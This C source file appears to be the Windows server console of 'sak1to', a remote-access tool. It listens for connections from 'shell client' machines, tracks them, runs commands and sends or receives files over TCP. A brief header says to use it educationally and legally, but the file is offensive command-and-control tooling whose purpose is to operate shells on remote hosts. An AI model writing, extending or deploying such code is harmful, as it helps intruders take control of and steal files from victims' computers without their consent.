/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#define CONSOLE_FSTR "sak1to-console-(%s>"
#define INTERACT_FSTR "%d-(%s)-%s>"
#define WINDOWS 1
#define INVALID_FILE INVALID_HANDLE_VALUE
#define READ 1
#define WRITE 0

typedef HANDLE s_file;

typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	SOCKET sock;

} Conn;

typedef struct {
	// Mutex object for race condition checks.
	HANDLE ghMutex;

	// Server buffer.
	char buf[BUFLEN + 1];

	// Thread handle for handling execution/termination of accept_conns thread.
	HANDLE acp_thread;

	// Server socket for accepting connections.
	SOCKET listen_socket;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t clients_alloc;

	// Amount of memory used.
	size_t clients_sz;

} Server_map;

void bind_socket(const SOCKET listen_socket);
void sakito_accept_conns(Server_map* const s_map);
void resize_conns(Server_map* const s_map, int client_id);

// Windows sakito-API wrapper for storing current working directory in a provided buffer.
void get_cwd(char* const buf) 
{
	GetCurrentDirectory(BUFLEN, buf);
}

// Function to gracefully terminate server.
void terminate_server(const SOCKET socket, const char* const error) 
{
	int err_code = EXIT_SUCCESS;
	if (error) 
	{
		fprintf(stderr, "%s: %ld\n", error, WSAGetLastError());
		err_code = 1;
	}

	closesocket(socket);
	WSACleanup();
	exit(err_code);
}

// Windows sakito-API wrapper for sending data over TCP.
int sakito_tcp_send(const SOCKET socket, const char* buf, const size_t count) 
{
	return send(socket, buf, count, 0);
}

// Windows sakito-API wrapper for receiving data over TCP.
int sakito_tcp_recv(const SOCKET socket, char* const buf, const size_t count) 
{
	return recv(socket, buf, count, 0);
}

// Windows sakito-API WriteFile() WINAPI wrapper for writing data to stdout.
int write_stdout(const char* buf, size_t count) 
{
	HANDLE std_out = GetStdHandle(STD_OUTPUT_HANDLE);
	if (!WriteFile(std_out, buf, count, NULL, NULL))
		return FAILURE;

	return SUCCESS;
}

// Windows sakito-API wrapper for creating a socket object.
const SOCKET create_socket() 
{
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) 
	{
		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	int optval = 1;
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) != 0)
		terminate_server(listen_socket, "Error setting socket options");

	return listen_socket;
}

// Windows sakito-API wrapper for mutex locking to prevent race conditions from occurring.
void mutex_lock(Server_map* const s_map) 
{
	// If mutex is currently locked wait until it is unlocked.
	WaitForSingleObject(s_map->ghMutex, INFINITE);
}

// Windows sakito-API wrapper for mutex unlocking to prevent race conditions from occurring.
void mutex_unlock(Server_map* const s_map) 
{
	// Unlock mutex.
	ReleaseMutex(s_map->ghMutex);
}

// Windows sakito-API wrapper for opening/creating a file (s_file is a typedef for HANDLE).
s_file sakito_open_file(const char *filename, int rw_flag) 
{
	// Supports only READ/WRITE file modes/operations.
	if (rw_flag == WRITE)
		return sakito_win_openf(filename, GENERIC_WRITE, CREATE_ALWAYS);
	else if (rw_flag == READ)
		return sakito_win_openf(filename, GENERIC_READ, OPEN_EXISTING);
	
	return INVALID_FILE;
}

// Windows sakito-API wrapper for closing a s_file/HANDLE.
int sakito_close_file(s_file file) 
{
	return CloseHandle(file);
}

// Windows sakito-API wrapper for TCP file transfer (send).
int sakito_send_file(const SOCKET socket, s_file file, char* const buf, int32_t f_size) 
{
	// Wraps sakito_win_sendf located in headers/sakito_core.h this function is used by both the widnows server and shell client.
	return sakito_win_sendf(file, socket, buf, f_size);
}

// Windows sakito-API wrapper for TCP file transfer (recv).
int sakito_recv_file(const SOCKET socket, s_file file, char* const buf, int32_t f_size) 
{
	// Wraps sakito_win_recvf located in headers/sakito_core.h this function is used by both the widnows server and shell client.
	return sakito_win_recvf(file, socket, buf, f_size);
}

// Windows sakito-API wrapper for calulating the size of a given s_file/HANDLE.
int32_t sakito_file_size(s_file file) 
{
	return sakito_win_fsize(file);
}

void exec_cmd(Server_map* const s_map) 
{
	sakito_win_cp(NULL, s_map->buf);
	fputc('\n', stdout);
}

// Windows sakito-API wrapper for terminating the console application and server.
void terminate_console(Server_map* const s_map) 
{
	// Quit accepting connections.
	TerminateThread(s_map->acp_thread, 0);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			closesocket(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	// Stop accepting connections.
	terminate_server(s_map->listen_socket, NULL);
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) 
{
	// Call sakito wrapper function to accept incoming connections.
	Server_map* const s_map = (Server_map*)lp_param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	sakito_accept_conns(s_map);

	return FAILURE;
}

// Windows sakito-API wrapper for console application and server initialization.
void sakito_init(Server_map* const s_map) 
{
	// Mutex lock for preventing race conditions.
	s_map->ghMutex = CreateMutex(NULL, FALSE, NULL);

	// Begin accepting connections.
	s_map->acp_thread = CreateThread(0, 0, accept_conns, s_map, 0, 0);
}
